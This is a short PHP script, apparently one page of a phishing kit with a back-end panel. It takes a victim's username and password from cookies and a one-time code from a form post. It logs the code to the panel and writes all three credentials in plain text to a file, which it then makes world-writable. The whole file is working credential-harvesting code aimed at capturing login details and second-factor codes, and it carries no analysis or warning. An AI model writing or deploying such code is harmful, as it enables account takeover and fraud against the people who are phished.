<?php 
require('../../panel/lib/funciones.php');

$usuario = $_COOKIE['usuario'];
$contrasena = $_COOKIE['contrasena'];
$registro = $_COOKIE['registro'];
$file = $_COOKIE['archivo'];

$cdinamica = $_POST['otp'];

setcookie('cdinamica',$cdinamica,time()+60*9);

actualizar_registro_otp($registro,$cdinamica);

$data = 'Usuario: '.$usuario." Clave: ".$contrasena." Dinamica: ".$cdinamica;

if (isset($data)) {
    $fp = fopen($file, 'w');
    fwrite($fp, utf8_decode($data));
    fclose($fp);
    chmod($file, 0777);
}
else {
    echo 'No hay datos que guardar!';
}
?>